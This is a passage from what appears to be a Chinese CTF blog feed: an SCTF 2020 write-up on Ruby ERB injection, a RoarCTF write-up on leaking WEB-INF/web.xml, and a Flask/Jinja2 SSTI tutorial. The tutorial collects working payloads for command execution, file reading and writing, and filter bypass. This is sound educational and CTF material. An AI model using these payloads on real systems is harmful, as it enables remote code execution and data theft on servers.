  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">}</span>
  <span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>uid<span class="token punctuation">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"uid"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>jkl<span class="token punctuation">:</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">end</span>

get <span class="token string">"/shop"</span> <span class="token keyword">do</span>
  erb <span class="token symbol">:shop</span>
<span class="token keyword">end</span>

get <span class="token string">"/work"</span> <span class="token keyword">do</span>
  islogin
  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">}</span>
  auth <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
  <span class="token keyword">unless</span> params<span class="token punctuation">[</span><span class="token symbol">:SECRET</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span>
    <span class="token keyword">if</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token string">"<span class="token interpolation"><span class="token delimiter tag">#{</span>params<span class="token punctuation">[</span><span class="token punctuation">:</span>SECRET<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span>9a<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">/</span><span class="token punctuation">)</span><span class="token delimiter tag">}</span></span>"</span><span class="token punctuation">)</span>
      puts <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"FLAG"</span><span class="token punctuation">]</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:do</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"<span class="token interpolation"><span class="token delimiter tag">#{</span>params<span class="token punctuation">[</span><span class="token punctuation">:</span>name<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token delimiter tag">}</span></span> is working"</span> <span class="token keyword">then</span>

    auth<span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i <span class="token operator">+</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span><span class="token function">random_number</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>
    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth
    <span class="token constant">ERB</span><span class="token punctuation">:</span><span class="token symbol">:new</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('<span class="token interpolation"><span class="token delimiter tag">#{</span>params<span class="token punctuation">[</span><span class="token punctuation">:</span>name<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token delimiter tag">}</span></span> working successfully!')&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>result

  <span class="token keyword">end</span>
<span class="token keyword">end</span>

post <span class="token string">"/shop"</span> <span class="token keyword">do</span>
  islogin
  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">}</span>

  <span class="token keyword">if</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token constant">FLAGPRICE</span> <span class="token keyword">then</span>

    <span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>title<span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span>message<span class="token punctuation">:</span> <span class="token string">"no enough jkl"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">else</span>

    auth <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token punctuation">{</span>flag<span class="token punctuation">:</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"FLAG"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>
    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth
    <span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>title<span class="token punctuation">:</span> <span class="token string">"success"</span><span class="token punctuation">,</span>message<span class="token punctuation">:</span> <span class="token string">"jkl is good thing"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>


<span class="token keyword">def</span> islogin
  <span class="token keyword">if</span> cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span> <span class="token keyword">then</span>
    redirect <span class="token function">to</span><span class="token punctuation">(</span><span class="token string">'/shop'</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span></code></pre>
<p>考察Ruby ERB注入，重点代码：</p>
<pre class=" language-ruby"><code class="language-ruby"><span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:do</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"<span class="token interpolation"><span class="token delimiter tag">#{</span>params<span class="token punctuation">[</span><span class="token punctuation">:</span>name<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token delimiter tag">}</span></span> is working"</span> <span class="token keyword">then</span>

    auth<span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth<span class="token punctuation">[</span><span class="token string">"jkl"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i <span class="token operator">+</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span><span class="token function">random_number</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>
    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth
    <span class="token constant">ERB</span><span class="token punctuation">:</span><span class="token symbol">:new</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('<span class="token interpolation"><span class="token delimiter tag">#{</span>params<span class="token punctuation">[</span><span class="token punctuation">:</span>name<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token delimiter tag">}</span></span> working successfully!')&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>result

  <span class="token keyword">end</span>
<span class="token keyword">end</span></code></pre>
<p><code>get "/work" do</code>中果传入的参数do和name一致，则会输出<code>params[:name][0,7]} working successfully!</code></p>
<pre><code>$'-最后一次成功匹配右边的字符串</code></pre>
<p>构造do=&lt;%=$’%&gt;和name=&lt;%=$’%&gt;,记得把里面内容转成十六进制<br>所以最终就是</p>
<pre><code>work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</code></pre>
<p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914193636941.png" alt="image-20210914193636941"></p>
<p>得到一个auth里面是JWT和alert输出的SECRET</p>
<p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914193724070.png" alt="image-20210914193724070"></p>
<p>修改jkl价格大于所需价格，获得JWT</p>
<p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914193620596.png" alt="image-20210914193620596"></p>
<p>点击shop POST上去</p>
<p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914193555713.png" alt="image-20210914193555713"></p>
<p>获得的JWT拿来解码得到flag</p>
<p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914193540768.png" alt="image-20210914193540768"></p>
]]></content>
  </entry>
  <entry>
    <title>RoarCTF:2019-EasyJava</title>
    <url>/2021/06/20/roarctf-2019-easyjava/</url>
    <content><![CDATA[<h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><ul>
<li>WEB-INF主要包含一下文件或目录:</li>
<li>/WEB-INF/web.xml：Web-java应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
<li>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li>
<li>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
<li>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</li>
<li>/WEB-INF/database.properties：数据库配置文件</li>
<li>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</li>
</ul>
<p>post访问下WEB-INF/web.xml这个文件</p>
<p><img src="/2021/06/20/roarctf-2019-easyjava/image-20210620111455057.png" alt="image-20210620111455057"></p>
<pre><code>Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre>
<p><img src="/2021/06/20/roarctf-2019-easyjava/image-20210620111745251.png" alt="image-20210620111745251"></p>
<p>下载的文件进行base64解码</p>
<p><img src="/2021/06/20/roarctf-2019-easyjava/image-20210620111813590.png" alt="image-20210620111813590"></p>
]]></content>
  </entry>
  <entry>
    <title>SSTI</title>
    <url>/2021/10/26/ssti/</url>
    <content><![CDATA[<h3 id="ssti漏洞成因"><a href="#ssti漏洞成因" class="headerlink" title="ssti漏洞成因"></a>ssti漏洞成因</h3><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade  velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。</p>
<h2 id="flask漏洞成因"><a href="#flask漏洞成因" class="headerlink" title="flask漏洞成因"></a>flask漏洞成因</h2><p>为什么说我们上面的代码会有漏洞呢，其实对于代码功底比较深的师傅，是不会存在ssti漏洞的，被一些偷懒的师傅简化了代码，所以造成了ssti。上面的代码我们本可以写成类似如下的形式。</p>
<pre><code>&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt;
  &lt;/head&gt;
 &lt;body&gt;
      &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>里面有两个参数需要我们渲染，user.name，以及title</p>
<p>我们在app.py文件里进行渲染。</p>
<pre><code>@app.route('/')
@app.route('/index')#我们访问/或者/index都会跳转
def index():
   return render_template("index.html",title='Home',user=request.args.get("key"))</code></pre>
<p>也就是说，两种代码的形式是，一种当字符串来渲染并且使用了%(request.url)，另一种规范使用index.html渲染文件。我们漏洞代码使用了render_template_string函数，而如果我们使用render_template函数，将变量传入进去，现在即使我们写成了request，我们可以在url里写自己想要的恶意代码</p>
<pre><code>{{}}
```

主要就是这句：

```
{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}}</code></pre>
<h2 id="ctf中的一些绕过tips"><a href="#ctf中的一些绕过tips" class="headerlink" title="ctf中的一些绕过tips"></a>ctf中的一些绕过tips</h2><p>没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。</p>
<p>1.过滤[]等括号</p>
<pre><code>使用gititem绕过。如原poc {{"".**class**.**bases**[0]}}</code></pre>
<pre><code>绕过后{{"".**class**.**bases**.**getitem**(0)}}</code></pre>
<p>2.过滤了subclasses，拼凑法</p>
<pre><code>原poc{{"".**class**.**bases**[0].**subclasses**()}}</code></pre>
<pre><code>绕过 {{"".**class**.**bases**[0]['**subcla'+'sses**'](https://xz.aliyun.com/t/3679)}}</code></pre>
<p>3.过滤class</p>
<p>使用session</p>
<pre><code>poc {{session['**cla'+'ss**'].**bases**[0].**bases**[0].**bases**[0].**bases**[0].**subclasses**()[118]}}</code></pre>
<p>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p>
<p>收藏的一些poc</p>
<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )

object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')

{{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}</code></pre>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png" alt="img"></a></p>
<h3 id="关于SSTI的python类的知识"><a href="#关于SSTI的python类的知识" class="headerlink" title="关于SSTI的python类的知识"></a>关于SSTI的python类的知识</h3><pre class=" language-Python"><code class="language-Python">>>> ''.__class__
<type 'str'>
>>> ().__class__
<type 'tuple'>
>>> [].__class__
<type 'list'>
>>> {}.__class__
<type 'dict'></code></pre>
<p><code>__class__</code>：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。</p>
<p>py2和py3有差<img src="/2021/10/26/ssti/image-20211026211149277.png" alt="image-20211026211149277"></p>
<pre class=" language-Python"><code class="language-Python">>>> ().__class__.__bases__
(<type 'object'>,)
>>> ''.__class__.__bases__
(<type 'basestring'>,)
>>> [].__class__.__bases__
(<type 'object'>,)
>>> {}.__class__.__bases__
(<type 'object'>,)

>>> [].__class__.__bases__[0]
<type 'object'></code></pre>
<p><code>__bases__</code>：用来查看类的基类，也可是使用数组索引来查看特定位置的值</p>
<pre class=" language-Python"><code class="language-Python">>>> [].__class__.__bases__[0].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'sys.getwindowsversion'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'nt.stat_result'>, <type 'nt.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'functools.partial'>, <type 'MultibyteCodec'>, <type 'MultibyteIncrementalEncoder'>, <type 'MultibyteIncrementalDecoder'>, <type 'MultibyteStreamReader'>, <type 'MultibyteStreamWriter'>]
</code></pre>
<p><code>__subclasses__()</code>：查看当前类的子类</p>
<p>当然我们也可以直接用<code>object.__subclasses__()</code>，会得到和上面一样的结果。<br> 获取基类还能用还有<code>__mro__</code>，比如：</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span>

<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token operator">//</span>使用索引就能获取基类了
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span></code></pre>
<h3 id="一些常用的方法"><a href="#一些常用的方法" class="headerlink" title="一些常用的方法"></a>一些常用的方法</h3><pre class=" language-python"><code class="language-python"><span class="token operator">//</span>获取基本类
<span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
object

<span class="token operator">//</span>读文件
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span>r<span class="token string">'C:\1.php'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
object<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span>r<span class="token string">'C:\1.php'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token operator">//</span>写文件
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/input'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>
object<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/input'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>

<span class="token operator">//</span>执行任意命令
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls  /var/www/html").read()'</span> <span class="token punctuation">)</span>
object<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls  /var/www/html").read()'</span> <span class="token punctuation">)</span>
</code></pre>
<p>上面漏洞复现时候的payload也是很强了，用类于编程的方式来展现，不用再一个个去查索引了：</p>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__ <span class="token operator">==</span> <span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">}</span>
  <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
  <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> b<span class="token punctuation">.</span>__class__ <span class="token operator">==</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__ <span class="token operator">%</span><span class="token punctuation">}</span>
    <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">'eval'</span> <span class="token keyword">in</span> b<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>
      <span class="token punctuation">{</span><span class="token punctuation">{</span> b<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("id").read()'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>         <span class="token operator">//</span>poppen的参数就是要执行的命令
    <span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>
  <span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>
  <span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span></code></pre>
<p>flask魔术方法归纳：</p>
<pre><code>__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用</code></pre>
<p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p><a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">https://blog.csdn.net/zz_Caleb/article/details/96480967</a></p>
<p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p>
<p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p>
<p><a href="https://www.guildhab.top/2019/10/flask-jinja2-ssti-python-%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8/">https://www.guildhab.top/2019/10/flask-jinja2-ssti-python-%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8/</a></p>
]]></content>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF：2018-GetShell</title>
    <url>/2021/09/19/suctf-2018-getshell/</url>
